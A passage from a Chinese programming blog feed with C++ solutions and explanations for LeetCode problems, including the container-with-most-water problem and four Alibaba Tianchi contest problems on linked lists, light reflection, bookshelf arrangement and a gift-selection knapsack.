<li>二分查找:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; leftMax;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; rightMax;</span><br><span class="line">        <span class="comment">/* left to right*/</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(leftMax.<span class="built_in">begin</span>(), leftMax.<span class="built_in">end</span>(), height[i]);</span><br><span class="line">            <span class="keyword">if</span> (it != leftMax.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="type">int</span> start = it - leftMax.<span class="built_in">begin</span>();</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, (i - start) * height[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                leftMax.<span class="built_in">emplace_back</span>(height[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                leftMax.<span class="built_in">emplace_back</span>(<span class="built_in">max</span>(leftMax.<span class="built_in">back</span>(), height[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* right to left */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(rightMax.<span class="built_in">begin</span>(), rightMax.<span class="built_in">end</span>(), height[i]);</span><br><span class="line">            <span class="keyword">if</span> (it != rightMax.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="type">int</span> start = it - rightMax.<span class="built_in">begin</span>();</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, (n - i - <span class="number">1</span> - start) * height[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == n - <span class="number">1</span>) &#123;</span><br><span class="line">                rightMax.<span class="built_in">emplace_back</span>(height[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rightMax.<span class="built_in">emplace_back</span>(<span class="built_in">max</span>(rightMax.<span class="built_in">back</span>(), height[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>线段树+ 二分：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;tmax = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n * <span class="number">4</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;height = height;</span><br><span class="line">        <span class="built_in">buildTree</span>(<span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">queryLeft</span>(i, height[i], <span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> y = <span class="built_in">queryRight</span>(i, height[i], <span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            res = <span class="built_in">max</span>(res, height[i] * (i - x));</span><br><span class="line">            res = <span class="built_in">max</span>(res, height[i] * (y - i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            tmax[idx] = height[l];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">buildTree</span>(l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            <span class="built_in">buildTree</span>(mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            tmax[idx] = <span class="built_in">max</span>(tmax[idx * <span class="number">2</span>], tmax[idx * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">queryLeft</span><span class="params">(<span class="type">int</span> end, <span class="type">int</span> val, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; end) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmax[idx] &lt; val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            <span class="keyword">return</span> l;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (tmax[idx * <span class="number">2</span>] &gt;= val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryLeft</span>(end, val, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mid &lt; end) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryLeft</span>(end, val, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">queryRight</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> val, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmax[idx] &lt; val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            <span class="keyword">return</span> l;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (tmax[idx * <span class="number">2</span> + <span class="number">1</span>] &gt;= val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryRight</span>(start, val, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (start &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">queryRight</span>(start, val, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tmax;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; height;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode 阿里天池专场</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/48/</url>
    <content><![CDATA[<h2 id="leetcode-阿里天池专场"><a href="#leetcode-阿里天池专场" class="headerlink" title="leetcode 阿里天池专场"></a>leetcode 阿里天池专场</h2><p>第三题与第四题确实比较难，前两题都是常规题目</p>
<h4 id="221021天池-01-统计链表奇数节点"><a href="#221021天池-01-统计链表奇数节点" class="headerlink" title="221021天池-01. 统计链表奇数节点"></a>221021天池-01. 统计链表奇数节点</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个链表的头节点 <code>head</code>，请统计链表中值为 奇数 的节点个数</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [2,1,8]</span><br><span class="line">输出：1</span><br><span class="line">解释：链表中存在 1 个奇数值的节点，值为 1</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4]</span><br><span class="line">输出：2</span><br><span class="line">解释：链表中存在 2 个奇数值的节点，值分别为 1、3</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li>链表中节点的数目在 <code>[1, 5000]</code> 范围内。</li>
<li><code>1 &lt;= Node.val &lt;= 10000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/tianchi2022/problems/yGdjWb/">https://leetcode.cn/contest/tianchi2022/problems/yGdjWb/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接遍历整个链表即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberEvenListNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head-&gt;val % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="221021天池-02-光线反射"><a href="#221021天池-02-光线反射" class="headerlink" title="221021天池-02. 光线反射"></a>221021天池-02. 光线反射</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>工程师正在研究一个 <code>N*M</code> 大小的光线反射装置，装置内部的构造记录于 <code>grid</code> 中，其中</p>
<ul>
<li><code>&#39;.&#39;</code> 表示空白区域，不改变光的传播方向</li>
<li><code>&#39;R&#39;</code> 表示向右倾斜的 双面 均可反射光线的镜子，改变光的传播方向</li>
<li><code>&#39;L&#39;</code> 表示向左倾斜的 双面 均可反射光线的镜子，改变光的传播方向<br>假如光线从装置的左上方垂直向下进入装置，请问在离开装置前，光线在装置内部经过多长的路线。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [&quot;...&quot;,&quot;L.L&quot;,&quot;RR.&quot;,&quot;L.R&quot;]</span><br><span class="line">输出：12</span><br><span class="line">解释：如图所示，光线经过路线长度为 12</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [&quot;R.&quot;,&quot;..&quot;]</span><br><span class="line">输出：1</span><br><span class="line">解释：如图所示，光线经过路线长度为 1</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= grid.length, grid[i].length &lt;= 100</code></li>
<li><code>grid[i][j]</code> 仅为 <code>&#39;L&#39;、&#39;R&#39;</code> 和 <code>&#39;.&#39;</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/">https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目比较简单，只是一个简单的转换，我们设有四个方向：左上右下，沿着四个方向射入某个单元格。</li>
</ol>
<ul>
<li>遇到右倾斜，则变换为:下右上左</li>
<li>遇到左倾斜，则变换为:上左下右<br>根据当前的变换即可得到最终的结果。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m \times n)$，其中 $m$ 表示矩阵的行数，$n$ 表示矩阵的列数。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getLength</span><span class="params">(vector&lt;string&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="type">int</span> cr[<span class="number">4</span>] = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> cl[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>&#125;;</span><br><span class="line">        queue&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt; qu;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; x &lt; m &amp;&amp; y &lt; n) &#123;</span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">if</span> (grid[x][y] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                x = x + dir[d][<span class="number">0</span>];</span><br><span class="line">                y = y + dir[d][<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (grid[x][y] == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                d = cl[d];</span><br><span class="line">                x = x + dir[d][<span class="number">0</span>];</span><br><span class="line">                y = y + dir[d][<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (grid[x][y] == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                d = cr[d];</span><br><span class="line">                x = x + dir[d][<span class="number">0</span>];</span><br><span class="line">                y = y + dir[d][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="221021天池-03-整理书架"><a href="#221021天池-03-整理书架" class="headerlink" title="221021天池-03. 整理书架"></a>221021天池-03. 整理书架</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>书架上有若干本书，从左至右的书籍编号记于整型数组 <code>order</code> 中。为保证书籍多样性，管理员想取走一些重复编号的书籍，要求满足以下条件：</p>
<ul>
<li>剩余书本中相同编号的书本数量均不大于 <code>limit</code></li>
<li>取走的书籍数量尽可能少<br>由于存在多种整理方案，请返回剩余书本编号的排列为「最小排列」的方案。</li>
</ul>
<p>注意：</p>
<p>「最小排列」：若干数组中第一位数字最小的数组；若第一位数字相同，则为第二位数字最小的数组，以此类推。<br>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：order = [5,5,6,5], limit = 2</span><br><span class="line">输出：[5,5,6]</span><br><span class="line">解释：order 中出现了 3 次 5 号书：</span><br><span class="line">方案 1：去掉 order[0] 或 order[1]，所得排列为 [5,6,5]；</span><br><span class="line">方案 2：去掉 order[3]，所得排列为 [5,5,6]；</span><br><span class="line">经比较，最终返回排列最小的方案 2：[5,5,6]。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：order = [5,5,6,5], limit = 3</span><br><span class="line">输出：[5,5,6,5]</span><br><span class="line">解释：order 中所有相同编号的书本数目均未超过 limit，不需要去除，返回 [5,5,6,5]</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：order = [3,3,9,8,9,2,8], limit = 1</span><br><span class="line">输出：[3,8,9,2]</span><br><span class="line">解释：列表中 3、8、9 号数字都出现了 2 次，去掉编号相同的书后的排列结果中 [3,8,9,2] 为排列最小的结果。</span><br></pre></td></tr></table></figure>
<p>示例 4：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：order = [2,1,2,2,1,3,3,1,3,3], limit = 2</span><br><span class="line">输出：[1,2,2,1,3,3]</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= order.length &lt;= 10^5</code></li>
<li><code>1 &lt;= limit &lt;= 10</code></li>
<li><code>1 &lt;= order[i] &lt;= 10^6</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/tianchi2022/problems/ev2bru/">https://leetcode.cn/contest/tianchi2022/problems/ev2bru/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心 + 栈
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本身有些难，比较难想到，最后看了解答用的贪心的栈，关键是在于剔除的操作，比如当前候选队列分别为 $[2,3,2],[2,1,2]$，由于我们现在需要剔除一个 $2$，则：</li>
</ol>
<ul>
<li>对于第一种情况由于由于 $3$ 比 $2$ 大，此时我们需要检测 $3$ 之前存储的</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arrangeBookshelf</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; order, <span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt, st_cnt;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : order) &#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">emplace_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : order) &#123;</span><br><span class="line">            <span class="comment">/* skip the current val */</span></span><br><span class="line">            <span class="keyword">if</span> (st_cnt[x] == limit) &#123;</span><br><span class="line">                cnt[x]--;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (x &lt; res.<span class="built_in">back</span>() &amp;&amp; cnt[res.<span class="built_in">back</span>()] &gt; limit) &#123;</span><br><span class="line">                cnt[res.<span class="built_in">back</span>()]--;</span><br><span class="line">                st_cnt[res.<span class="built_in">back</span>()]--;</span><br><span class="line">                res.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(x);</span><br><span class="line">            st_cnt[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; res.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="221021天池-04-意外惊喜"><a href="#221021天池-04-意外惊喜" class="headerlink" title="221021天池-04. 意外惊喜"></a>221021天池-04. 意外惊喜</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>某电商平台举办了一个用户抽奖活动，奖池中共有若干个礼包，每个礼包中包含一些礼物。 <code>present[i][j]</code> 表示第 <code>i</code> 个礼包第 <code>j</code> 件礼（下标从 <code>0</code> 开始）物的价值。抽奖规则如下：</p>
<ul>
<li>每个礼包中的礼物摆放是有顺序的，你必须从第 <code>0</code> 件礼物开始打开；</li>
<li>对于同一个礼包中的礼物，必须在打开该礼包的第 <code>i</code> 个礼物之后，才能打开第 <code>i+1</code> 个礼物；</li>
<li>每个礼物包中的礼物价值 非严格递增。<br>参加活动的用户总共可以打开礼物 <code>limit</code> 次，请返回用户能够获得的 最大 礼物价值总和。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: present = [[1,2],[2,3],[3,4]], limit = 3</span><br><span class="line">输出: 9</span><br><span class="line">解释：最佳的方案为：</span><br><span class="line">第 1 次拿走第 3 个礼包中的第 1 个礼物，得到价值 3；</span><br><span class="line">第 2 次拿走第 3 个礼包中的第 2 个礼物，得到价值 4；</span><br><span class="line">第 3 次拿走第 2 个礼物包的第 1 个礼物，得到价值 2；</span><br><span class="line">返回打开的礼物价值总和 3 + 4 + 2 = 9</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: present = [[1,2,100],[4,5],[3,4]], limit = 4</span><br><span class="line">输出: 107</span><br><span class="line">解释：最佳的方案为：</span><br><span class="line">第 1 次拿走第 1 个礼包中的第 1 个礼物，得到价值 1；</span><br><span class="line">第 2 次拿走第 1 个礼包中的第 2 个礼物，得到价值 2；</span><br><span class="line">第 3 次拿走第 1 个礼物包的第 3 个礼物，得到价值 100；</span><br><span class="line">第 4 次拿走第 2 个礼物包的第 1 个礼物，得到价值 4；</span><br><span class="line">返回打开的礼物价值总和 107</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= present.length &lt;= 2000</code></li>
<li><code>1 &lt;= present[i].length &lt;= 1000</code></li>
<li><code>1 &lt;= present[i][j] &lt;= present[i][j+1] &lt;= 10^5</code></li>
<li><code>1 &lt;= limit &lt;= 1000</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/tianchi2022/problems/tRZfIV/">https://leetcode.cn/contest/tianchi2022/problems/tRZfIV/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 归并+ 01背包</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目难度太大，还是参考题解，很少会出这么难的题目。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(limit \times n \times \log n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n \times m)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">brilliantSurprise</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; present, <span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = present.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">s</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; present.<span class="built_in">size</span>(); i += <span class="number">1</span>) &#123;</span><br><span class="line">            s[i].<span class="built_in">resize</span>(present[i].<span class="built_in">size</span>() + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; present[i].<span class="built_in">size</span>(); j += <span class="number">1</span>)</span><br><span class="line">                s[i][j + <span class="number">1</span>] = s[i][j] + present[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(limit + <span class="number">1</span>)</span></span>;</span><br><span class="line">        function&lt;<span class="type">void</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; DFS = [&amp;](<span class="type">int</span> L, <span class="type">int</span> R) &#123;</span><br><span class="line">            <span class="type">int</span> M = (L + R) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (L == R) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, pre = <span class="number">0</span>; i &lt;= limit; i += <span class="number">1</span>) &#123;</span><br><span class="line">                    pre = <span class="built_in">max</span>(pre, dp[i]);</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans, pre + s[M][<span class="built_in">min</span>((<span class="type">int</span>)s[M].<span class="built_in">size</span>() - <span class="number">1</span>, limit - i)]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">auto</span> f = dp;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = M + <span class="number">1</span>; i &lt;= R; i += <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> g = dp;</span><br><span class="line">                    <span class="type">int</span> x = (<span class="type">int</span>)s[i].<span class="built_in">size</span>() - <span class="number">1</span>, y = s[i].<span class="built_in">back</span>();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> j = x; j &lt;= limit; j += <span class="number">1</span>)</span><br><span class="line">                        g[j] = <span class="built_in">max</span>(g[j], dp[j - x] + y);</span><br><span class="line">                    dp.<span class="built_in">swap</span>(g);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">DFS</span>(L, M);</span><br><span class="line">                dp = f;</span><br><span class="line">            &#125;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">auto</span> f = dp;</span><br><span class="line">                <span class="keyword">for</span> (<span 